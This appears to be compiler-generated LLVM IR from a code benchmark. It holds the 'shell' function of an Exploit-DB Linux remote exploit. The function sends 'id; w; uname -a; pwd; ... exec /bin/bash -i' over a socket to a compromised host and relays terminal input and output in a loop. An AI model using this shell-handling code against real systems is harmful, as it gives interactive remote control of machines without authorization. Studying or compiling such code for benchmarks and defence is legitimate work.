; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_23188.c_shell.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_23188.c_shell.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@__const.shell.cmd = private unnamed_addr constant [59 x i8] c"id; w; uname -a; pwd;export TERM=vt100; exec /bin/bash -i\0A\00", align 16
@stdout = common dso_local global i32 0, align 4
@STDIN_FILENO = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [3 x i8] c"%s\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @shell(i32 %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca [59 x i8], align 16
  %5 = alloca [2048 x i8], align 16
  %6 = alloca i32, align 4
  store i32 %0, i32* %2, align 4
  %7 = bitcast [59 x i8]* %4 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 16 %7, i8* align 16 getelementptr inbounds ([59 x i8], [59 x i8]* @__const.shell.cmd, i32 0, i32 0), i64 59, i1 false)
  %8 = getelementptr inbounds [2048 x i8], [2048 x i8]* %5, i64 0, i64 0
  %9 = call i32 @bzero(i8* %8, i32 2048)
  %10 = load i32, i32* %2, align 4
  %11 = getelementptr inbounds [59 x i8], [59 x i8]* %4, i64 0, i64 0
  %12 = getelementptr inbounds [59 x i8], [59 x i8]* %4, i64 0, i64 0
  %13 = call i32 @strlen(i8* %12)
  %14 = call i32 @send(i32 %10, i8* %11, i32 %13, i32 0)
  br label %15

15:                                               ; preds = %1, %60
  %16 = load i32, i32* @stdout, align 4
  %17 = call i32 @fflush(i32 %16)
  %18 = call i32 @FD_ZERO(i32* %6)
  %19 = load i32, i32* %2, align 4
  %20 = call i32 @FD_SET(i32 %19, i32* %6)
  %21 = load i32, i32* @STDIN_FILENO, align 4
  %22 = call i32 @FD_SET(i32 %21, i32* %6)
  %23 = load i32, i32* %2, align 4
  %24 = add nsw i32 %23, 1
  %25 = call i32 @select(i32 %24, i32* %6, i32* null, i32* null, i32* null)
  %26 = load i32, i32* %2, align 4
  %27 = call i64 @FD_ISSET(i32 %26, i32* %6)
  %28 = icmp ne i64 %27, 0
  br i1 %28, label %29, label %42

29:                                               ; preds = %15
  %30 = load i32, i32* %2, align 4
  %31 = getelementptr inbounds [2048 x i8], [2048 x i8]* %5, i64 0, i64 0
  %32 = call i32 @read(i32 %30, i8* %31, i32 2048)
  store i32 %32, i32* %3, align 4
  %33 = icmp sle i32 %32, 0
  br i1 %33, label %34, label %36

34:                                               ; preds = %29
  %35 = call i32 @exit(i32 1) #4
  unreachable

36:                                               ; preds = %29
  %37 = load i32, i32* %3, align 4
  %38 = sext i32 %37 to i64
  %39 = getelementptr inbounds [2048 x i8], [2048 x i8]* %5, i64 0, i64 %38
  store i8 0, i8* %39, align 1
  %40 = getelementptr inbounds [2048 x i8], [2048 x i8]* %5, i64 0, i64 0
  %41 = call i32 @printf(i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str, i64 0, i64 0), i8* %40)
  br label %42

42:                                               ; preds = %36, %15
  %43 = load i32, i32* @STDIN_FILENO, align 4
  %44 = call i64 @FD_ISSET(i32 %43, i32* %6)
  %45 = icmp ne i64 %44, 0
  br i1 %45, label %46, label %60

46:                                               ; preds = %42
  %47 = load i32, i32* @STDIN_FILENO, align 4
  %48 = getelementptr inbounds [2048 x i8], [2048 x i8]* %5, i64 0, i64 0
  %49 = call i32 @read(i32 %47, i8* %48, i32 2048)
  store i32 %49, i32* %3, align 4
  %50 = icmp sgt i32 %49, 0
  br i1 %50, label %51, label %59

51:                                               ; preds = %46
  %52 = load i32, i32* %3, align 4
  %53 = sext i32 %52 to i64
  %54 = getelementptr inbounds [2048 x i8], [2048 x i8]* %5, i64 0, i64 %53
  store i8 0, i8* %54, align 1
  %55 = load i32, i32* %2, align 4
  %56 = getelementptr inbounds [2048 x i8], [2048 x i8]* %5, i64 0, i64 0
  %57 = load i32, i32* %3, align 4
  %58 = call i32 @write(i32 %55, i8* %56, i32 %57)
  br label %59

59:                                               ; preds = %51, %46
  br label %60

60:                                               ; preds = %59, %42
  br label %15
}

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #1

declare dso_local i32 @bzero(i8*, i32) #2

declare dso_local i32 @send(i32, i8*, i32, i32) #2

declare dso_local i32 @strlen(i8*) #2

declare dso_local i32 @fflush(i32) #2

declare dso_local i32 @FD_ZERO(i32*) #2

declare dso_local i32 @FD_SET(i32, i32*) #2

declare dso_local i32 @select(i32, i32*, i32*, i32*, i32*) #2

declare dso_local i64 @FD_ISSET(i32, i32*) #2

declare dso_local i32 @read(i32, i8*, i32) #2

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #3

declare dso_local i32 @printf(i8*, i8*) #2

declare dso_local i32 @write(i32, i8*, i32) #2

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { argmemonly nounwind willreturn }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
